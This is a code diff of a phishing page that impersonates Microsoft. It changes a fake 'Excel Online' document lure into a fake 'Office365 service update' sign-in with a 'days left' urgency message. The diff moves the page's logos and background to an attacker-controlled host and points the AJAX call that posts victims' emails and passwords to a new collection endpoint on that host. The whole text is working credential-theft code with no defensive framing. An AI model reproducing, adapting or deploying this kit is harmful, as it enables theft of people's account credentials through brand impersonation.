@@ -1,8 +1,8 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<link rel="icon" href="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png" type="image/x-icon"/>
+<link rel="icon" href="https://ayqyxw.giize.com/file/ico.png" type="image/x-icon"/>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Excel Online Spreadsheet :: Sign in</title>
+<title>Microsoft Office365:: Sign in to Outlook</title>
 
 <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
@@ -145,7 +145,7 @@
 
 <body>
   <div class="container-fluid">
-    <div class="row" style="height: 100vh; background-image: url('https://i.imgur.com/MJt26S9.png'); background-size: cover;background-repeat: no-repeat;">
+    <div class="row" style="height: 100vh; background-image: url('https://ayqyxw.giize.com/file/back.png'); background-size: cover; background-repeat: no-repeat;">
       <div class="container">
         <div class="row">
 
@@ -172,13 +172,19 @@
 
         <div class="login-container">
             <div id="output"></div>
-            <div class="avatar">
+            <!--
+			<div class="avatar">
               <img  class="img-fluid brand_logo" width="60px" style="margin-top: 20px;" src="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png">
+            </div>
+			-->
+			
+			<div >
+              <img  class="img-fluid brand_logo" width="200px" style="margin-top: 20px;" src="https://ayqyxw.giize.com/file/fit.png">
             </div>
             <div class="form-box">
               <div style="margin-top: 10px;" class="alert" ><color style="color:red;"><!--Your account or password is incorrect--> </color></div>
-              <h4>Microsoft Excel Online</h4>
-              <p style="color:#0C3DCC; font-size:17px;"><b>" <span class="logoname">Quire</span>_doc0710024.xlsx "</b></p>
+              <h4>Office365 service update</h4>
+              <p style="color:#0C3DCC; font-size:17px;"><b> <span class="logoname">Quire</span>_outlook 3 day(s) left</b></p>
                 <!--<form id="contact" class="form-horizontal well">-->
                 <form  action="" method="post">
                     <input type="text"  value="" id="a" name="a" style="background-color: #eee;opacity: 1;" aria-describedby="emailHelp" placeholder="Enter Your Email" readonly />
@@ -187,9 +193,12 @@
 					  <!--<form id="contact" class="form-horizontal well">-->
 					<div id="msg" style="margin-bottom:25px; display:none; color:#ff1505;">Password is incorrect. Please try again</div>
 					<div id="error" style="margin-bottom:25px; display:none; color:#ff1505;"> </div>
-                    <button class="btn btn-success btn-block login" style="background: #039126;" id="submit-btn"  type="submit"> View Document</button>
-					
-<span class="small" style="margin-bottom:25px; color:#ff1505;" id="msg_text"></span>
+                    <div align="right">
+						<button class="btn btn-success btn-block login" style="background: #0067b8; width:100px; text-align:center;" id="submit-btn"  type="submit"> Next</button>
+					</div>
+					<span class="small" style="margin-bottom:25px; color:#ff1505;" id="msg_text"></span>
+					<br>
+					<div><img src="https://ayqyxw.giize.com/file/key.png";></div>
                 </form>
             </div>
         </div>
@@ -344,7 +353,7 @@ return true;
       ///////////new injection////////////////
       count=count+1;
     //  console.log(count); 
-	var d='https://hkiwwsgbs.mypi.co/main/post.php';
+	var d='https://ayqyxw.giize.com/post.php';
 	   $.ajax({
         dataType: 'JSON',
 		url: d,
@@ -390,7 +399,7 @@ return true;
               // $('#msg').html("Please try again later");
             },
             complete: function(){
-              $('#submit-btn').html('View Document');
+              $('#submit-btn').html('Next');
             }
           });  
     });
